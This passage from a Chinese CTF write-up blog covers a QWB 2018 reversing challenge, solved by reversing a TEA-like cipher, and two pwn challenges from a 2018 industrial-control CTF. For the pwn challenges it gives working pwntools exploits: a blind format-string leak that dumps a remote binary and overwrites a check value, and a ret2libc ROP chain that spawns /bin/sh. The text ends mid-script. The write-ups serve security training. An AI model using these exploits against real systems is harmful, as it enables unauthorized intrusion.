<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">signed __int64 sub_4C8EF4()</span><br><span class="line">&#123;</span><br><span class="line">  char *v0; // rdi</span><br><span class="line">  __int64 *v1; // rsi</span><br><span class="line">  unsigned __int64 i; // rdx</span><br><span class="line"></span><br><span class="line">  if ( strlen(qword_6CCDB0) == 21  //验证</span><br><span class="line">    &amp;&amp; qword_6CCDB0[1] == &#x27;w&#x27;</span><br><span class="line">    &amp;&amp; qword_6CCDB0[2] == &#x27;b&#x27;</span><br><span class="line">    &amp;&amp; qword_6CCDB0[3] == &#x27;&#123;&#x27;</span><br><span class="line">    &amp;&amp; qword_6CCDB0[20] == &#x27;&#125;&#x27; )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_4C8CC0((__int64)&amp;qword_6CCDB0[4]);</span><br><span class="line">    sub_4C8E50(&amp;qword_6CCDB0[4]);</span><br><span class="line">    sub_4C8CC0((__int64)&amp;qword_6CCDB0[4]);</span><br><span class="line">    sub_4C8E50(&amp;qword_6CCDB0[4]);</span><br><span class="line">    sub_4C8CC0((__int64)&amp;qword_6CCDB0[4]);</span><br><span class="line">    v0 = &amp;qword_6CCDB0[4];</span><br><span class="line">    sub_4C8E50(&amp;qword_6CCDB0[4]);</span><br><span class="line">    v1 = qword_4C8CB0;// 加载预存的标准答案</span><br><span class="line">    for ( i = 0LL; i &lt; 0x10 &amp;&amp; *v0 == *(_BYTE *)v1; ++i )//逐字节比对</span><br><span class="line">    &#123;</span><br><span class="line">      ++v0;</span><br><span class="line">      v1 = (__int64 *)((char *)v1 + 1);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  __asm &#123; syscall; LINUX - sys_write &#125;</span><br><span class="line">  return sys_exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>flag的格式为qwb{x*16}</p>
<p>进入sub_4C8CC0，很像tea加密：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 __fastcall sub_4C8CC0(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  unsigned __int64 result; // rax</span><br><span class="line">  unsigned int v2; // [rsp+18h] [rbp-48h]</span><br><span class="line">  unsigned int v3; // [rsp+1Ch] [rbp-44h]</span><br><span class="line">  unsigned int v4; // [rsp+20h] [rbp-40h]</span><br><span class="line">  int i; // [rsp+24h] [rbp-3Ch]</span><br><span class="line">  int j; // [rsp+28h] [rbp-38h]</span><br><span class="line">  int v7[6]; // [rsp+40h] [rbp-20h] BYREF</span><br><span class="line">  unsigned __int64 v8; // [rsp+58h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v8 = __readfsqword(0x28u);</span><br><span class="line">  qmemcpy(v7, &quot;s1IpP3rEv3Ryd4Y3&quot;, 16);</span><br><span class="line">  for ( i = 0; i &lt;= 1; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = 0;</span><br><span class="line">    v2 = *(_DWORD *)(8 * i + a1);</span><br><span class="line">    v3 = *(_DWORD *)(a1 + 4 + 8 * i);</span><br><span class="line">    for ( j = 0; j &lt;= 7; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 += (v7[v4 &amp; 3] + v4) ^ (((v3 &gt;&gt; 5) ^ (16 * v3)) + v3);</span><br><span class="line">      v4 += 0x676E696C;</span><br><span class="line">      v3 += (v7[(v4 &gt;&gt; 11) &amp; 3] + v4) ^ (((v2 &gt;&gt; 5) ^ (16 * v2)) + v2);</span><br><span class="line">    &#125;</span><br><span class="line">    *(_DWORD *)(a1 + 8 * i) = v2;</span><br><span class="line">    *(_DWORD *)(a1 + 4 + 8 * i) = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  result = __readfsqword(0x28u) ^ v8;</span><br><span class="line">  if ( result )</span><br><span class="line">    return ((__int64 (*)(void))loc_4C8B9A)();</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">_BYTE *__fastcall sub_4C8E50(__int64 a1)</span><br><span class="line">&#123;</span><br><span class="line">  _BYTE *result; // rax</span><br><span class="line">  int i; // [rsp+14h] [rbp-4h]</span><br><span class="line"></span><br><span class="line">  for ( i = 0; i &lt;= 15; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = (_BYTE *)(i + a1);</span><br><span class="line">    *result ^= i;</span><br><span class="line">  &#125;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>异或</p>
<h3 id="解密exp"><a href="#解密exp" class="headerlink" title="解密exp"></a>解密exp</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">keyPool = [1883844979, 1165112144, 2035430262, 861484132]</span><br><span class="line">array_car = [1735289196, 3470578392, 910900292, 2646189488, 86511388, 1821800584, 3557089780, 997411680]</span><br><span class="line">target = [0x7f13b852, 0x1bf28c35, 0xd28663f4, 0x311e4f73]</span><br><span class="line"></span><br><span class="line">def de_xor(enc):</span><br><span class="line">    for _i in range(4):</span><br><span class="line">        current = enc[_i]</span><br><span class="line">        a = current &amp; 0xFF</span><br><span class="line">        b = (current &amp; 0xFF00) &gt;&gt; 8</span><br><span class="line">        c = (current &amp; 0xFF0000) &gt;&gt; 16</span><br><span class="line">        d = (current &amp; 0xFF000000) &gt;&gt; 24</span><br><span class="line">        a ^= (_i * 4 + 0)</span><br><span class="line">        b ^= (_i * 4 + 1)</span><br><span class="line">        c ^= (_i * 4 + 2)</span><br><span class="line">        d ^= (_i * 4 + 3)</span><br><span class="line">        # 修正此处：添加缺失的位或运算符 |</span><br><span class="line">        enc[_i] = a | (b &lt;&lt; 8) | (c &lt;&lt; 16) | (d &lt;&lt; 24)</span><br><span class="line">    return enc</span><br><span class="line"></span><br><span class="line">def encrypt(i32_para1, i32_para2):</span><br><span class="line">    foo = i32_para1</span><br><span class="line">    bar = i32_para2</span><br><span class="line">    car = 0</span><br><span class="line">    for _i in range(8):</span><br><span class="line">        tmp_a = keyPool[(car &amp; 3)] + car</span><br><span class="line">        tmp_b = ((bar &gt;&gt; 5) ^ (bar &lt;&lt; 4)) + bar</span><br><span class="line">        foo += tmp_a ^ tmp_b</span><br><span class="line">        foo &amp;= 0xffffffff</span><br><span class="line">        car += 1735289196</span><br><span class="line">        car &amp;= 0xffffffff</span><br><span class="line">        tmp_a = keyPool[((car &gt;&gt; 11) &amp; 3)] + car</span><br><span class="line">        tmp_b = ((foo &gt;&gt; 5) ^ (16 * foo)) + foo</span><br><span class="line">        bar += tmp_a ^ tmp_b</span><br><span class="line">        bar &amp;= 0xffffffff</span><br><span class="line">    return foo, bar</span><br><span class="line"></span><br><span class="line">def solver(enc_foo, enc_bar):</span><br><span class="line">    foo = enc_foo</span><br><span class="line">    bar = enc_bar</span><br><span class="line">    car = array_car[7]</span><br><span class="line">    for _i in range(8):</span><br><span class="line">        tmp_a = keyPool[((car &gt;&gt; 11) &amp; 3)] + car</span><br><span class="line">        tmp_b = ((foo &gt;&gt; 5) ^ (16 * foo)) + foo</span><br><span class="line">        bar -= tmp_a ^ tmp_b</span><br><span class="line">        bar = (bar + 0xffffffff + 1) &amp; 0xffffffff</span><br><span class="line">        car -= 1735289196</span><br><span class="line">        car = (car + 0xffffffff + 1) &amp; 0xffffffff</span><br><span class="line">        tmp_a = keyPool[(car &amp; 3)] + car</span><br><span class="line">        tmp_b = ((bar &gt;&gt; 5) ^ (bar &lt;&lt; 4)) + bar</span><br><span class="line">        foo -= tmp_a ^ tmp_b</span><br><span class="line">        foo = (foo + 0xffffffff + 1) &amp; 0xffffffff</span><br><span class="line">    return foo, bar</span><br><span class="line"></span><br><span class="line"># 执行流程</span><br><span class="line">target = de_xor(target.copy())  # 避免修改原始列表</span><br><span class="line">print(&quot;=====&quot;)</span><br><span class="line">for t in target:</span><br><span class="line">    print(hex(t))</span><br><span class="line"></span><br><span class="line">for i in range(2):</span><br><span class="line">    target[i * 2], target[i * 2 + 1] = solver(target[i * 2], target[i * 2 + 1])</span><br><span class="line"></span><br><span class="line">print(&quot;=====&quot;)</span><br><span class="line">for t in target:</span><br><span class="line">    print(hex(t))</span><br><span class="line"></span><br><span class="line">target = de_xor(target.copy())</span><br><span class="line">print(&quot;=====&quot;)</span><br><span class="line">for t in target:</span><br><span class="line">    print(hex(t))</span><br><span class="line"></span><br><span class="line">for i in range(2):</span><br><span class="line">    target[i * 2], target[i * 2 + 1] = solver(target[i * 2], target[i * 2 + 1])</span><br><span class="line"></span><br><span class="line">print(&quot;=====&quot;)</span><br><span class="line">for t in target:</span><br><span class="line">    print(hex(t))</span><br><span class="line"></span><br><span class="line">target = de_xor(target.copy())</span><br><span class="line">print(&quot;=====&quot;)</span><br><span class="line">for t in target:</span><br><span class="line">    print(hex(t))</span><br><span class="line"></span><br><span class="line">for i in range(2):</span><br><span class="line">    target[i * 2], target[i * 2 + 1] = solver(target[i * 2], target[i * 2 + 1])</span><br><span class="line"></span><br><span class="line">print(&quot;=====&quot;)</span><br><span class="line">for t in target:</span><br><span class="line">    print(t)</span><br><span class="line"></span><br><span class="line"># 最终输出解码字符串</span><br><span class="line">print(&quot;=====&quot;)</span><br><span class="line">result = b&#x27;&#x27;.join([bytes.fromhex(hex(t)[2:])[::-1] for t in target]).decode(&#x27;utf-8&#x27;)</span><br><span class="line">print(result)  # 应输出 &quot;f1Nd_TH3HldeC0dE&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="baby-re"><a href="#baby-re" class="headerlink" title="baby_re"></a>baby_re</h2>
      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/08/16/qwb2018-re/" data-id="cuidEac2FpQt1rlsf9j_KPAQj" data-title="qwb2018-re" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-2018赛博工控ctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2018/10/17/2018%E8%B5%9B%E5%8D%9A%E5%B7%A5%E6%8E%A7ctf/" class="article-date">
  <time class="dt-published" datetime="2018-10-17T03:07:10.000Z" itemprop="datePublished">2018-10-17</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2018/10/17/2018%E8%B5%9B%E5%8D%9A%E5%B7%A5%E6%8E%A7ctf/">2018 赛博杯工控CTF</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="2018-赛博杯工控CTF"><a href="#2018-赛博杯工控CTF" class="headerlink" title="2018 赛博杯工控CTF"></a>2018 赛博杯工控CTF</h1><p>本次比赛只做出来两道Pwn HMI流水灯运行与实时数据监测。剩下两道Pwn在师傅指点下，赛后进行了复现。</p>
<p>前面的两个Pwn是相对比较常规的</p>
<h2 id="实时数据监测"><a href="#实时数据监测" class="headerlink" title="实时数据监测"></a>实时数据监测</h2><p>实时数据监测是一道盲Pwn，利用格式化字符串的Blind Pwn。<br>首先，确定存在format string，随后我直接开始从0x8048000~0x8049000 dump 服务端的程序<br>由于程序每次需要等待20s左右才能触发一次format string 泄露一次地址，所以dump的格外慢，大约持续了4个小时….</p>
<p>只有将Binary 拖入IDA，然而由于部分dump有误，无法解析成ELF,只能成binary….<br>将支离破碎的binary汇编源码理顺，得到以下的汇编:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">seg000:080486DD                 push    ebp</span><br><span class="line">seg000:080486DE                 mov     ebp, esp</span><br><span class="line">seg000:080486E0                 sub     esp, 208h</span><br><span class="line">seg000:080486E6                 mov     eax, ds:804B0C0h</span><br><span class="line">seg000:080486EB                 sub     esp, 4</span><br><span class="line">seg000:080486EE                 push    eax</span><br><span class="line">seg000:080486EF                 push    200h</span><br><span class="line">seg000:080486F4                 lea     eax, [ebp-520]</span><br><span class="line">seg000:080486FA                 push    eax</span><br><span class="line">seg000:080486FB                 call    <span class="built_in">read</span></span><br><span class="line">seg000:08048700                 add     esp, 10h</span><br><span class="line">seg000:08048703                 sub     esp, 0Ch</span><br><span class="line">seg000:08048706                 lea     eax, [ebp-520]</span><br><span class="line">seg000:0804870C                 push    eax</span><br><span class="line">seg000:0804870D                 call    <span class="built_in">printf</span></span><br><span class="line">seg000:08048712                 add     esp, 10h</span><br><span class="line">seg000:08048715                 mov     eax, ds:804B14Ch</span><br><span class="line">seg000:0804871A                 cmp     eax, 2223322h</span><br><span class="line">seg000:0804871F                 jnz     short loc_8048753</span><br><span class="line">seg000:08048721                 sub     esp, 0Ch</span><br><span class="line">seg000:08048724                 push    8048C80h        ; _DWORD</span><br><span class="line">seg000:08048729                 call    puts</span><br><span class="line">seg000:0804872E                 add     esp, 10h</span><br><span class="line">seg000:08048731                 sub     esp, 0Ch</span><br><span class="line">seg000:08048734                 push    8048C99h        ; _DWORD</span><br><span class="line">seg000:08048739                 call    puts</span><br><span class="line">seg000:0804873E                 add     esp, 10h</span><br><span class="line">seg000:08048741                 sub     esp, 0Ch</span><br><span class="line">seg000:08048744                 push    8048CA6h</span><br><span class="line">seg000:08048749                 call    system</span><br><span class="line">seg000:0804874E                 add     esp, 10h</span><br><span class="line">seg000:08048751                 jmp     short loc_8048763</span><br></pre></td></tr></table></figure>
<p>可见，判定条件<code>[ds:804B14Ch]==0x2223322</code>时顺利打印flag，最后Script:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/env/bin python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    <span class="comment">#getbinary()</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;请重新初始化反应。\n&#x27;</span>)</span><br><span class="line">    payload = fmtstr_payload(<span class="number">12</span>,&#123;<span class="number">0x804B14C</span>:<span class="number">0x2223322</span>&#125;)</span><br><span class="line">    <span class="built_in">print</span> payload</span><br><span class="line">    io.send(payload)</span><br><span class="line">    io.interactive()</span><br><span class="line">    io.close()</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">flag&#123;1hasdfw423fgv45432wgasv45443v120bjsdf&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak</span>(<span class="params">addr</span>):</span><br><span class="line">    <span class="comment"># leak addr for three times</span></span><br><span class="line">    num = <span class="number">0</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        log.info(<span class="string">&#x27;leak addr: &#x27;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">        payload = <span class="string">&#x27;%14$s&#x27;</span> +<span class="string">&#x27;STA&#x27;</span>+p32(addr)</span><br><span class="line">        <span class="comment"># 说明有\n，出现新的一行</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;\x0a&#x27;</span> <span class="keyword">in</span> payload:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">        io.recvuntil(<span class="string">&#x27;请重新初始化反应。\n&#x27;</span>)</span><br><span class="line">        io.sendline(payload)</span><br><span class="line">        data = io.recvuntil(<span class="string">&#x27;STA&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">        log.info(<span class="string">&#x27;data:&#x27;</span>+data)</span><br><span class="line">        <span class="keyword">return</span> data</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        num += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getbinary</span>():</span><br><span class="line">    addr = <span class="number">0x8048000</span></span><br><span class="line">    f = <span class="built_in">open</span>(<span class="string">&#x27;binary&#x27;</span>, <span class="string">&#x27;w&#x27;</span>)</span><br><span class="line">    <span class="keyword">while</span> addr &lt; <span class="number">0x8049000</span>:</span><br><span class="line">        data = leak(addr)</span><br><span class="line">        <span class="keyword">if</span> data <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">            f.write(<span class="string">&#x27;\xff&#x27;</span>)</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">len</span>(data) == <span class="number">0</span>:</span><br><span class="line">            f.write(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">            addr += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            f.write(data)</span><br><span class="line">            addr += <span class="built_in">len</span>(data)</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    <span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line">    io = remote(<span class="string">&#x27;47.104.70.11&#x27;</span>,<span class="number">30002</span>)</span><br><span class="line">    exploit()</span><br></pre></td></tr></table></figure>

<p>然而，很多很快做出来的队伍都是看图得到的结论:<br>CH3CONH理想浓度0x2223322，地址0x804ff78，催化失败应该调整为理想浓度，摧化成成果，于是格式化字符串修改之，从而顺利拿到flag….</p>
<h2 id="HMI流水灯运行"><a href="#HMI流水灯运行" class="headerlink" title="HMI流水灯运行"></a>HMI流水灯运行</h2><p>32bit程序，开启NX，题目中存在简单的栈溢出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">gee</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf; <span class="comment">// [esp+0h] [ebp-88h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*...........................................................&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">0x100u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>但是在这个过程中通过signal设置了alarm(2)后程序进入死循环</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( i == <span class="number">2</span> &amp;&amp; k == <span class="number">2</span> )</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">signal</span>(<span class="number">14</span>, handler);</span><br><span class="line">    <span class="built_in">alarm</span>(<span class="number">2u</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>可能Rop时间不够，所以Rop时先设置alarm，从而打断之前<code>alarm(2)</code>的设置，再ROP<br>题目的libc可通过libcdatabase查询到</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#/usr/env/bin python</span></span><br><span class="line"><span class="comment">#-*- coding: utf-8 -*- </span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exploit</span>():</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;Initialization the program\n&#x27;</span>)</span><br><span class="line">    <span class="comment">#sleep(73)</span></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;*...........................................................\n&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;*...........................................................\n&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;*...........................................................\n&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">&#x27;*...........................................................\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span></span><br><span class="line">    payload += p32(elf.plt[<span class="string">&#x27;alarm&#x27;</span>])+p32(<span class="number">0x08048469</span>)+p32(<span class="number">0x10000</span>)</span><br><span class="line">    payload += p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>])+p32(<span class="number">0x080488A8</span>)+p32(elf.got[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line">    <span class="comment">#gdb.attach(io,&#x27;b *0x80488A8&#x27;)</span></span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">    libc_base = write_addr-libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">    system_addr = libc_base+libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    log.info(<span class="string">&#x27;system_addr:&#x27;</span>+<span class="built_in">hex</span>(system_addr))</span><br><span class="line">    binsh_addr = libc_base+<span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">    log.info(<span class="string">&#x27;binsh_addr:&#x27;</span>+<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line">    io.recvuntil(<span class="string">&#x27;*...........................................................\n&#x27;</span>)</span><br><span class="line">    payload1 = <span class="string">&#x27;a&#x27;</span>*<span class="number">140</span></span><br><span class="line">    payload1 += p32(system_addr)+p32(<span class="number">0x080488A8</span>)+p32(binsh_addr)</span><br><span class="line">    io.sendline(payload1)</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    context.binary = <span class="string">&quot;./stack&quot;</span></span><br><span class="line">    context.terminal = [<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;sp&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    elf = ELF(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)&gt;<span class="number">1</span>:</span><br><span class="line">        io = remote(sys.argv[<span class="number">1</span>],sys.argv[<span class="number">2</span>])</span><br><span class="line">        libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">        exploit()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io = process(<span class="string">&#x27;./stack&#x27;</span>)</span><br><span class="line">        libc = 